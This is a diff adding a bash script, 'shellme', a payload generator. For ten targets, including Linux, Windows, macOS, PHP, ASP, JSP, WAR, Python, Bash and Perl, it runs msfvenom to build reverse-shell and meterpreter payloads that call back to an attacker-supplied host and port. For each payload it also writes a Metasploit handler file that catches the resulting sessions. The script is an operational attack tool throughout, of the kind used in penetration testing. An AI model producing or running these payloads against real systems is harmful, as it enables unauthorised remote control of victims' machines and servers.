@@ -1,0 +1,152 @@
+#!/usr/bin/env bash
+
+if [ -z "$1" ]
+  then
+    echo "Error: target type not specified"
+    echo "usage: shellme <targetType> <LHOST> [ <LPORT=4444> ]"
+    exit
+elif [ -z "$2" ]
+  then
+    echo "Error: LHOST ip address not specified"
+    echo "usage: shellme <targetType> <LHOST> [ <LPORT=4444> ]"
+    exit
+fi
+
+case $1 in
+
+  linux)
+    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$2 LPORT=${3-4444} -f elf > meterpreter.elf
+    chmod +x meterpreter.elf
+    cat << FOO > linux.handler
+      use exploit/multi/handler
+      set PAYLOAD linux/x86/meterpreter/reverse_tcp
+      set LHOST $2
+      set LPORT ${3-4444}
+      set ExitOnSession false
+      exploit -j -z
+FOO
+    ;;
+
+  windows)
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$2 LPORT=${3-4444} -f exe > meterpreter.exe
+    chmod +x meterpreter.exe
+    cat << FOO > windows.handler
+      use exploit/multi/handler
+      set PAYLOAD windows/meterpreter/reverse_tcp
+      set LHOST $2
+      set LPORT ${3-4444}
+      set ExitOnSession false
+      exploit -j -z
+FOO
+    ;;
+
+  mac)
+    msfvenom -p osx/x86/shell_reverse_tcp LHOST=$2 LPORT=${3-4444} -f macho > shell.macho
+    chmod +x shell.macho
+    cat << FOO > mac.handler
+      use exploit/multi/handler
+      set PAYLOAD osx/x86/shell_reverse_tcp
+      set LHOST $2
+      set LPORT ${3-4444}
+      set ExitOnSession false
+      exploit -j -z
+FOO
+    ;;
+
+  php)
+    msfvenom -p php/meterpreter_reverse_tcp LHOST=$2 LPORT=${3-4444} -f raw > meterpreter.php
+    cat meterpreter.php | pbcopy && echo '<?php ' | tr -d '\n' > meterpreter.php && pbpaste >> meterpreter.php
+    chmod +x meterpreter.php
+    cat << FOO > php.handler
+      use exploit/multi/handler
+      set PAYLOAD php/meterpreter_reverse_tcp
+      set LHOST $2
+      set LPORT ${3-4444}
+      set ExitOnSession false
+      exploit -j -z
+FOO
+    ;;
+
+  asp)
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$2 LPORT=${3-4444} -f asp > meterpreter.asp
+    chmod +x meterpreter.asp
+    cat << FOO > asp.handler
+      use exploit/multi/handler
+      set PAYLOAD windows/meterpreter/reverse_tcp
+      set LHOST $2
+      set LPORT ${3-4444}
+      set ExitOnSession false
+      exploit -j -z
+FOO
+    ;;
+
+  jsp)
+    msfvenom -p java/jsp_shell_reverse_tcp LHOST=$2 LPORT=${3-4444} -f raw > shell.jsp
+    chmod +x shell.jsp
+    cat << FOO > jsp.handler
+      use exploit/multi/handler
+      set PAYLOAD java/jsp_reverse_tcp
+      set LHOST $2
+      set LPORT ${3-4444}
+      set ExitOnSession false
+      exploit -j -z
+FOO
+    ;;
+
+  war)
+    msfvenom -p java/jsp_shell_reverse_tcp LHOST=$2 LPORT=${3-4444} -f war > shell.war
+    chmod +x shell.war
+    cat << FOO > war.handler
+      use exploit/multi/handler
+      set PAYLOAD java/jsp_reverse_tcp
+      set LHOST $2
+      set LPORT ${3-4444}
+      set ExitOnSession false
+      exploit -j -z
+FOO
+    ;;
+
+  python)
+    msfvenom -p cmd/unix/reverse_python LHOST=$2 LPORT=${3-4444} -f raw > pyShell.py
+    chmod +x pyShell.py
+    cat << FOO > python.handler
+      use exploit/multi/handler
+      set PAYLOAD cmd/unix/reverse_python
+      set LHOST $2
+      set LPORT ${3-4444}
+      set ExitOnSession false
+      exploit -j -z
+FOO
+    ;;
+
+  bash)
+    msfvenom -p cmd/unix/reverse_bash LHOST=$2 LPORT=${3-4444} -f raw > shell.sh
+    chmod +x shell.sh
+    cat << FOO > bash.handler
+      use exploit/multi/handler
+      set PAYLOAD cmd/unix/reverse_bash
+      set LHOST $2
+      set LPORT ${3-4444}
+      set ExitOnSession false
+      exploit -j -z
+FOO
+    ;;
+
+  perl)
+    msfvenom -p cmd/unix/reverse_perl LHOST=$2 LPORT=${3-4444} -f raw > shell.pl
+    chmod +x shell.pl
+    cat << FOO > perl.handler
+      use exploit/multi/handler
+      set PAYLOAD cmd/unix/reverse_perl
+      set LHOST $2
+      set LPORT ${3-4444}
+      set ExitOnSession false
+      exploit -j -z
+FOO
+    ;;
+
+esac
+
+echo
+echo "Output reverse shell and handler to files"
+echo
